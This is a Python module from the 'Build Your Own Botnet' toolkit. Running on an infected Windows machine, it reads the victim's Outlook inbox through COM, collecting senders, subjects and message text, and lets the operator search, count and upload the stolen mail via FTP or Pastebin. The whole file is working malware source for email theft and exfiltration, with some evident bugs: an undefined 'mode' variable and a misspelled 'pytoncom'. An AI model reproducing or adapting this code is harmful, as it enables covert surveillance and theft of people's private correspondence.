#!/usr/bin/python
# -*- coding: utf-8 -*-
'Outlook Email (Build Your Own Botnet)'

# standard library
import os
import sys
import imp
import json
import urllib
import threading

# packages
if sys.platform == 'win32':
    import pythoncom
    import win32com.client

# utilities
import core.util as util

# globals
packages = ['win32com.client','pythoncom']
platforms = ['win32']
results = {}
usage = 'outlook <get/count/search/upload>'
description = """
Interact with the Outlook email client application on the client host machine
"""

# main
def _get_emails():
    pythoncom.CoInitialize()
    outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
    inbox   = outlook.GetDefaultFolder(6)
    unread  = inbox.Items
    while True:
        email = None
        try:
            email = unread.GetNext()
        except:
            break
        if email:
            sender   = email.SenderEmailAddress.encode('ascii','ignore')
            message  = email.Body.encode('ascii','ignore')[:100] + '...'
            subject  = email.Subject.encode('ascii','ignore')
            received = str(email.ReceivedTime).replace('/','-').replace('\\','')
            globals()['results'][received] = {'from': sender, 'subject': subject, 'message': message}
        else:
            break

def installed():
    """ 
    Check if Outlook is installed on the host machine
    """
    try:
        pytoncom.CoInitialize()
        outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
        return True
    except:
        return False

def get():
    """ 
    Get unread emails from Outlook inbox

    """
    t = threading.Thread(target=_get_emails)
    t.setDaemon(True)
    t.run()
    return "fetching unread emails from Outlook inbox"

def search(s):
    """ 
    Search the emails in the Outlook inbox 
    """
    pythoncom.CoInitialize()
    outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
    inbox   = outlook.GetDefaultFolder(6)
    emails  = util.emails(inbox.Items)
    for k,v in emails.items():
        if s not in v.get('message') and s not in v.get('subject') and s not in v.get('from'):
            emails.pop(k,v)
    return json.dumps(emails, indent=2)

def count():
    """ 
    Count unread emails in Outlook inbox
    """
    if len(globals()['results']):
        result  = len(globals()['results'])
    else:
        pythoncom.CoInitialize()
        outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
        inbox   = outlook.GetDefaultFolder(6)
        result  = len(inbox.Items)
    return "Emails in Outlook inbox: {}".format(result)

def upload(args):
    """ 
    Upload emails from Outlook via FTP or Pastebin
    """
    if len(globals()['results']):
        output = json.dumps(globals()['results'], indent=2)
        if mode in ('ftp','pastebin'):
            t = threading.Thread(target=globals()[mode], args=(output,))
            t.daemon = True
            t.start()
        else:
            return "Error: invalid upload mode (valid: ftp, pastebin)"
    else:
        return "No emails to upload (try fetching emails first)"

def run():
    """ 
    Run the Outlook email module

    """
    return globals()['usage']
